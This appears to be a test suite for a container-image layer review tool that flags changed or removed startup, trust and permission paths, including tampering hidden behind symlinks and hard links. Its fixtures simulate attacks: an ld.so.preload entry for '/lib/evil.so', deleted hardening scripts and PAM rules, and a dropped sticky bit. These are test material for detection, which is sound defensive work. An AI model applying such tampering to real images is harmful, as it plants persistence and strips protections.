    expect(moved.r.parts.join("\n")).toContain("=== root/.ssh/authorized_keys (changed) ===");
    const gone = await review([...OLD, "x2-old.tar"], [...OLD, "x2-old.tar", "x2-rm.tar"]);
    expect(gone.r.hits).toContain("startup path removed: root/.ssh/authorized_keys");
  });

  test("X1: a chain of hard links to a lower layer's file shows the lower layer's change", async () => {
    const { r } = await review([...OLD, "x1-old.tar", "x1-link.tar"], [...OLD, "x1-evil.tar", "x1-link.tar"]);
    expect(r.hits).toContain("startup path changed: etc/ld.so.preload");
    expect(r.parts.join("\n")).toContain("+/lib/evil.so");
  });
});

describe("dirChange", () => {
  test("dropping the sticky bit from a writable directory is weakening; from a non-writable one is not", () => {
    const d = (mode: number): FsNode => ({ path: "d", type: "dir", mode, uid: 0, gid: 0, size: 0, layer: "l", member: "d/" });
    expect(dirChange("usr/local/bin", d(0o1777), d(0o777), true).hit).toBe("directory permissions weakened: usr/local/bin (mode 1777 -> 0777)");
    expect(dirChange("x", d(0o1755), d(0o755), true).hit).toBeUndefined();
  });

  const dir = (mode: number, uid = 0, gid = 0): FsNode => ({ path: "d", type: "dir", mode, uid, gid, size: 0, layer: "l", member: "d/" });
  test("a changed owner of an important directory holds; of another, is only shown", () => {
    expect(dirChange("usr/local/bin", dir(0o755), dir(0o755, 1000), true)).toEqual({ line: "METADATA dir usr/local/bin: uid 0 -> 1000", hit: "directory owner changed: usr/local/bin (uid 0 -> 1000, gid 0 -> 0)" });
    expect(dirChange("opt/x", dir(0o755), dir(0o755, 1000), false)).toEqual({ line: "METADATA dir opt/x: uid 0 -> 1000" });
  });
  test("a new group or other write bit holds when important; losing one does not; a new directory is judged by its mode", () => {
    expect(dirChange("a", dir(0o777), dir(0o755), true).hit).toBeUndefined();
    expect(dirChange("a", undefined, dir(0o777), true).hit).toBe("directory permissions weakened: a (mode 0777)");
    expect(dirChange("a", undefined, dir(0o755), true)).toEqual({});
  });
});

describe("round 10", () => {
  // One layer pair per mandatory path. The suite runs bare `bun test` (5s default);
  // package.json's script allows 30s. A busy build host crossed 5s.
  test("Y2: every exact mandatory path is shown when a link above it points into an omitted cache path", async () => {
    for (const p of EXACT_MANDATORY) {
      const segs = p.split("/");
      if (segs.length < 2) continue;
      // The link sits at the top level, then at the directory holding the file.
      for (const at of [segs[0]!, segs.slice(0, -1).join("/")]) {
        const target = `var/cache/apt/${at}`;
        const phys = `${target}${p.slice(at.length)}`;
        const { r } = await reviewSpecs([{ [at]: { link: `/${target}` }, [phys]: "OLD-CONTENT\n" }], [{ [at]: { link: `/${target}` }, [phys]: "NEW-CONTENT\n" }]);
        expect(r.parts.join("\n"), `${p} behind a link at ${at}`).toContain("+NEW-CONTENT");
      }
    }
  }, 30_000);

  test("Y3: an empty trust or startup directory removed behind an aliased parent holds with evidence", async () => {
    const old: LayerSpec = { "etc/pki/tls": { link: "/var/cache/apt/t" }, "var/cache/apt/t/certs": { dir: true }, "etc/s6-overlay": { link: "/var/cache/apt/s" }, "var/cache/apt/s/services.d": { dir: true } };
    const { r, text } = await reviewSpecs([old], [old, { "var/cache/apt/t/.wh.certs": "", "var/cache/apt/s/.wh.services.d": "" }]);
    expect(r.hits).toContain("trust path removed: etc/pki/tls/certs");
    expect(r.hits).toContain("startup path removed: etc/s6-overlay/services.d");
    expect(text).toContain("removed: etc/pki/tls/certs");
    expect(text).toContain("removed: etc/s6-overlay/services.d");
  });

  test("Y4: a removed trust file is named, holds, and is the same as a removed startup file", async () => {
    const crt = "usr/local/share/ca-certificates/corp.crt";
    const { r, text } = await reviewSpecs([{ [crt]: "CERT\n" }], [{ [crt]: "CERT\n" }, { "usr/local/share/ca-certificates/.wh.corp.crt": "" }]);
    expect(r.hits).toContain(`trust path removed: ${crt}`);
    expect(text).toContain(`removed: ${crt}`);
  });

  test("Low: the first link resolution and the ancestor walks count against the shared work budget", () => {
    const ls = parseListing("sha256:w", "f", [1, 2, 3].map((i) => `lrwxrwxrwx  0 0      0           0 Oct 27 23:11 l${i} -> /d/a/b/c${i}`).join("\n"));
    const idx = MergedIndex.fromListings([ls]);
    // One unit under the cap: resolving three links and walking their ancestors must run it over.
    const hits: string[] = [];
    holderDirs([idx], { work: 1_999_999 }, hits);
    expect(hits).toContain("link resolution over budget");
    const la = linkAliases(idx, () => true, () => false, { work: 1_999_999 });
    expect(la.hits).toContain("link resolution over budget");
    const ok = linkAliases(idx, () => true, () => false, { work: 0 });
    expect(ok.hits).not.toContain("link resolution over budget");
  });

  test("R1: a repeated path in the baseline's layer holds too", async () => {
    const base: LayerSpec = { "var/cache/apt/A": "/lib/evil.so\n", "var/cache/apt/B": "/lib/safe.so\n" };
    const { r } = await reviewSpecs(
      (dir) => [base, { tar: hardlinkTar(`${dir}/old-links.tar`, [["var/cache/apt/mid", "var/cache/apt/B"], ["etc/ld.so.preload", "var/cache/apt/mid"], ["var/cache/apt/mid", "var/cache/apt/A"]]) }],
      (dir) => [base, { tar: hardlinkTar(`${dir}/new-links.tar`, [["var/cache/apt/mid", "var/cache/apt/A"], ["etc/ld.so.preload", "var/cache/apt/mid"]]) }],
    );
    expect(r.hits).toContain("layer repeats path: var/cache/apt/mid");
  });

  test("R2: removing a non-hard startup file or a maintainer script file holds", async () => {
    const f = "etc/cont-init.d/10-hardening";
    const a = await reviewSpecs([{ [f]: "#!/bin/sh\nharden\n" }], [{ [f]: "#!/bin/sh\nharden\n" }, { "etc/cont-init.d/.wh.10-hardening": "" }]);
    expect(a.r.hits).toContain(`startup path removed: ${f}`);
    const b = await reviewSpecs([{ "lib/apk/db/scripts.tar": "S\n" }], [{ "lib/apk/db/scripts.tar": "S\n" }, { "lib/apk/db/.wh.scripts.tar": "" }]);
    expect(b.r.hits).toContain("startup path removed: lib/apk/db/scripts.tar");
    // The same removal seen only through a link above the file.
    const link: LayerSpec = { "etc/cont-init.d": { link: "/var/cache/apt/ci" }, "var/cache/apt/ci/10-hardening": "harden\n" };
    const c = await reviewSpecs([link], [link, { "var/cache/apt/ci/.wh.10-hardening": "" }]);
    expect(c.r.hits).toContain(`startup path removed: ${f}`);
  });

  test("R3: a startup file or a trust file replaced by a directory is a loss, physical and through a link", async () => {
    const f = "etc/cont-init.d/10-hardening";
    const a = await reviewSpecs([{ [f]: "harden\n" }], [{ [f]: "harden\n" }, { [`${f}/keep`]: "" }]);
    expect(a.r.hits.some((h) => h.startsWith(`startup path removed: ${f}`))).toBe(true);
    const t = "etc/ssl/certs/corp.pem";
    const b = await reviewSpecs([{ [t]: "CERT\n" }], [{ [t]: "CERT\n" }, { [`${t}/x`]: "" }]);
    expect(b.r.hits.some((h) => h.startsWith(`trust path removed: ${t}`))).toBe(true);
    expect(b.text).toContain(`removed: ${t}`);
  });

  test("R4: removing a systemd drop-in or a PAM file holds and is named", async () => {
    const d = "etc/systemd/system/app.service.d/10-hardening.conf";
    const a = await reviewSpecs([{ [d]: "[Service]\nNoNewPrivileges=yes\n" }], [{ [d]: "[Service]\nNoNewPrivileges=yes\n" }, { "etc/systemd/system/app.service.d/.wh.10-hardening.conf": "" }]);
    expect(a.r.hits).toContain(`startup path removed: ${d}`);
    const b = await reviewSpecs([{ "etc/pam.d/sshd": "auth required pam_deny.so\n" }], [{ "etc/pam.d/sshd": "auth required pam_deny.so\n" }, { "etc/pam.d/.wh.sshd": "" }]);
    expect(b.r.hits).toContain("startup path removed: etc/pam.d/sshd");
    const link: LayerSpec = { "etc/pam.d": { link: "/var/cache/apt/pam" }, "var/cache/apt/pam/sshd": "OLD\n" };
    const c = await reviewSpecs([link], [link, { "var/cache/apt/pam/sshd": "NEW\n" }]);
    expect(c.r.parts.join("\n")).toContain("+NEW");
  });

  test("R5: the shared work budget stops the initial resolution and the subtree walk as it runs out, not after", () => {
    const links = parseListing("sha256:b", "f", Array.from({ length: 1000 }, (_, i) => `lrwxrwxrwx  0 0      0           0 Oct 27 23:11 l${i} -> /d`).join("\n"));
    const idx = MergedIndex.fromListings([links]);
    const b1 = { work: 1_999_990 };
    holderDirs([idx], b1, []);
    expect(b1.work).toBeLessThan(2_000_100);
    const b2 = { work: 1_999_990 };
    linkAliases(idx, () => true, () => false, b2);
    expect(b2.work).toBeLessThan(2_000_100);
    const kids = parseListing("sha256:k", "f", ["lrwxrwxrwx  0 0      0           0 Oct 27 23:11 etc/init.d -> /d", ...Array.from({ length: 5000 }, (_, i) => `drwxr-xr-x  0 0      0           0 Oct 27 23:11 d/k${i}/`)].join("\n"));
    const b3 = { work: 1_999_000 };
    linkAliases(MergedIndex.fromListings([kids]), () => true, () => true, b3);
    expect(b3.work).toBeLessThan(2_000_100);
  });
});
